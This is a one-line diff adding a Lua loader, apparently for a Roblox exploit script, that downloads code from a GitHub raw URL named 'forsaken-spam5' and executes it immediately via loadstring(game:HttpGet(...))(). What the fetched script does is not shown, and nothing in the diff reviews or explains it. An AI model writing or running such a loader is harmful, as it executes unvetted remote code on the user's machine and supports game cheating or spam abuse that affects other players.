@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/forsaken-spam5-zmoeqbfxm4pvv9.lua"))()
